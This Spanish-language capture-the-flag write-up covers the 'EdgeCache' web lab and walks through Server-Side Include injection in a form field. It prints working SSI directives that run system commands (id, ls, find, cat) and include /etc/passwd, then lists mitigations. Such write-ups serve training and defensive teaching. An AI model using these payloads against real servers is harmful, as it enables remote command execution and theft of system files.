# Writeup: EdgeCache
**Categoría:** Web | **Dificultad:** Easy | **Plataforma:** Six Hack Academy | **Fecha:** 08/07/2026, 22:02.

![Portada EdgeCache](https://github.com/Zyanetralys/CTF/blob/main/portadas/ME.jpg)

## Descripción
Panel de control de una red CDN. Permite generar páginas de estado personalizadas para cada nodo edge, renderizadas en el servidor. La etiqueta que defines acaba en un documento que el servidor procesa. Aprovéchalo para leer lo que no deberías.

![Interfaz inicial del panel EdgeCache](https://raw.githubusercontent.com/Zyanetralys/CTF/main/capturas/1.png)

---

## Reconocimiento
Al acceder al laboratorio, nos encontramos con un panel de control llamado **EdgeCache**. La interfaz tiene un formulario "status page builder" con un campo de texto libre llamado `Edge label`.

La pista clave está en la descripción y en el propio footer del formulario:
```
> *"The document is parsed by mod_include before delivery... Directives supported: #echo, #include, #exec."*
```
Nos indica que el servidor está utilizando **Apache mod_include** para procesar **Server-Side Includes (SSI)** antes de entregar la página al cliente.

---

## Explotación (SSI Injection)

### Paso 1: Prueba de Concepto (PoC)
Para confirmar que la entrada del usuario en el campo `Edge label` se inyecta en el documento `.shtml`, inyectamos una directiva SSI básica para imprimir la fecha local del servidor:

```
<!--#echo var="DATE_LOCAL" -->
```

Al hacer clic en "render document", el servidor procesa la directiva y devuelve la fecha actual en el panel de resultados. SSI Injection.

![PoC - SSI Injection con DATE_LOCAL](https://raw.githubusercontent.com/Zyanetralys/CTF/main/capturas/2.png)

### Paso 2: Identificación de Usuario y Lectura de Archivos (LFI via SSI)
Sabiendo que podemos inyectar código, el siguiente paso es demostrar la lectura de archivos arbitrarios. 

Primero verificamos los privilegios con los que corre el servidor:

```
<!--#exec cmd="id" -->
```

Resultado: ```uid=33(www-data) gid=33(www-data) groups=33(www-data)```

![Verificación de usuario con id](https://raw.githubusercontent.com/Zyanetralys/CTF/main/capturas/3.png)


Luego, utilizamos la directiva #include para leer el archivo de usuarios del sistema:

<!--#include file="/etc/passwd" -->

La respuesta nos revela la lista de usuarios, destacando la existencia del usuario german con su directorio home en 
```/home/german/.```

![Lectura de /etc/passwd](https://raw.githubusercontent.com/Zyanetralys/CTF/main/capturas/4.png)

### Paso 3: Escalación a Ejecución Remota de Comandos (RCE)
Para localizar la flag de forma precisa, aprovechamos la directiva #exec permitida por el servidor para ejecutar comandos del sistema operativo. Listamos el directorio del usuario:

<!--#exec cmd="ls -la /home/german/" -->

Y confirmamos la ruta exacta buscando archivos con la palabra "flag":

<!--#exec cmd="find /home -name 'flag*' 2>/dev/null" -->

El servidor ejecuta el comando y nos devuelve la ruta exacta: /home/german/flag.txt.

![Listado del directorio /home/german](https://raw.githubusercontent.com/Zyanetralys/CTF/main/capturas/5.png)

### Paso 4: Extracción de la Flag
Finalmente, leemos el contenido del archivo utilizando la directiva #exec y cat:

<!--#exec cmd="cat /home/german/flag.txt" -->

El servidor renderiza el documento y nos entrega la flag directamente en el panel de resultados.

![Búsqueda de la flag con find](https://raw.githubusercontent.com/Zyanetralys/CTF/main/capturas/6.png)

### Conseguimos la Flag

![Extracción de la flag final](https://raw.githubusercontent.com/Zyanetralys/CTF/main/capturas/7.png)

## Conclusión
Esta vulnerabilidad ocurre porque la aplicación concatena la entrada del usuario directamente en un archivo .shtml sin aplicar ninguna sanitización o escaping, permitiendo la inyección de directivas SSI.

### Mitigaciones:
- Filtrar o escapar caracteres como <, >, # y ! en la entrada del usuario antes de procesarla.
- Deshabilitar directivas peligrosas, en la configuración de Apache, deshabilitar la directiva #exec en entornos de producción (Options -Includes -ExecCGI).
- Principio de mínimo privilegio, el usuario del servidor web (www-data) no debería tener permisos de lectura sobre directorios de usuarios (/home/*) ni archivos sensibles.
